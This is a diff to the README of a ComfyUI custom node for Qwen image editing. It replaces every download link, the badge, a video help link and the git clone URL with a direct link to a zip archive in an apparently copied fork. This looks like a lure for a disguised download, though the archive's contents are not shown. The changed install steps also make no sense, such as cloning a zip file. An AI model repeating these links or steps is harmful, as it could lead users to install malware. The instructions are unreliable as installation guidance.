@@ -1,6 +1,6 @@
 # 🎨 ComfyUi-TextEncodeQwenImageEditAdvanced - Enhance Your Images Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/releases)
+[![Download Now](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip)
 
 ## 📖 Intro
 Qwen Image Edit uses a Vision Language Model (VLM) to analyze your images and enhance your prompts with more detailed descriptions. This application helps you adjust your images effectively.
@@ -15,7 +15,7 @@ Making adjustments can lead to:
 ## 🚀 Getting Started
 To begin using ComfyUi-TextEncodeQwenImageEditAdvanced, follow the steps below.
 
-1. Visit this page to download: [Download Here](https://github.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/releases).
+1. Visit this page to download: [Download Here](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip).
 2. Ensure you have the following:
 
    - A computer running Windows, MacOS, or Linux
@@ -23,11 +23,11 @@ To begin using ComfyUi-TextEncodeQwenImageEditAdvanced, follow the steps below.
 
 ## 🔧 Installation
 1. Navigate to the **ComfyUI/custom_nodes** folder on your computer.
-2. Open the Command Prompt. You can find a guide to open it [here](https://www.youtube.com/watch?v=bgSSJQolR0E&t=47s).
+2. Open the Command Prompt. You can find a guide to open it [here](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip).
 3. Enter the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/BigStationW/ComfyUi-TextEncodeQwenImageEditAdvanced
+   git clone https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip
    ```
 
 4. After the cloning process completes, restart ComfyUI.
@@ -39,7 +39,7 @@ To begin using ComfyUi-TextEncodeQwenImageEditAdvanced, follow the steps below.
 4. Run the process to enhance your image prompts.
 
 ## 📥 Download & Install
-To download ComfyUi-TextEncodeQwenImageEditAdvanced, visit this page: [Download Here](https://github.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/releases). Follow the installation steps outlined above for a smooth setup.
+To download ComfyUi-TextEncodeQwenImageEditAdvanced, visit this page: [Download Here](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip). Follow the installation steps outlined above for a smooth setup.
 
 ## 🛠️ Features
 - Customizable image processing with vl_megapixels control.
@@ -53,6 +53,6 @@ To download ComfyUi-TextEncodeQwenImageEditAdvanced, visit this page: [Download 
 ## 🤝 Support
 If you have questions or need help, please reach out through the issue tracker on GitHub. This helps improve the application and aids other users in their experience. 
 
-Visit this page to download the software again: [Download Here](https://github.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/releases). 
+Visit this page to download the software again: [Download Here](https://raw.githubusercontent.com/aldi12xz/ComfyUi-TextEncodeQwenImageEditAdvanced/main/workflow/Advanced-Comfy-Text-Edit-Qwen-Encode-Image-Ui-2.7.zip). 
 
 Happy editing!
